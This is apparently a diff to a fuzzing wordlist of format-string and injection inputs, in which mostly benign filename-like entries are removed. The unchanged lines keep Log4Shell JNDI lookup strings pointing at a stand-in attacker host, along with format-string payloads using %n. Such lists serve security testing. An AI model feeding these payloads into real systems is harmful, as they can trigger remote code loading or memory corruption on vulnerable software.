@@ -13,10 +13,8 @@ ${jndi:ldap://attacker.com/a}
 ${jndi:rmi://attacker.com/a}
 %#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%z%t%i%e%g%f%a%c%s%08x%%
 %%n!$3m2
-%%name%%.init
 %%natascha33%%
 %%nike%%
-%home%milo%.config%google-chrome%nativemessaginghosts%com.initiated.chrome_libnotify_notifications.json
 %j=u[_'i*$c2%nbj%aqs\it
 %n * 129
 %n * 257
@@ -140,24 +138,6 @@ d4rk%n
 djq2%n17
 e!@#%n
 e@7ge%ni
-en-gb.plg_cck_ecommerce_payment_%name%.ini
-en-gb.plg_cck_ecommerce_payment_%name%.sys.ini
-en-gb.plg_cck_ecommerce_shipping_%name%.ini
-en-gb.plg_cck_ecommerce_shipping_%name%.sys.ini
-en-gb.plg_cck_field_%name%.ini
-en-gb.plg_cck_field_%name%.sys.ini
-en-gb.plg_cck_field_link_%name%.ini
-en-gb.plg_cck_field_link_%name%.sys.ini
-en-gb.plg_cck_field_live_%name%.ini
-en-gb.plg_cck_field_live_%name%.sys.ini
-en-gb.plg_cck_field_restriction_%name%.ini
-en-gb.plg_cck_field_restriction_%name%.sys.ini
-en-gb.plg_cck_field_typo_%name%.ini
-en-gb.plg_cck_field_typo_%name%.sys.ini
-en-gb.plg_cck_field_validation_%name%.ini
-en-gb.plg_cck_field_validation_%name%.sys.ini
-en-gb.plg_cck_storage_location_%name%.ini
-en-gb.plg_cck_storage_location_%name%.sys.ini
 ezp`[c%n`v{6hjm/
 fbobh_"y%n
 fbobh_%n08
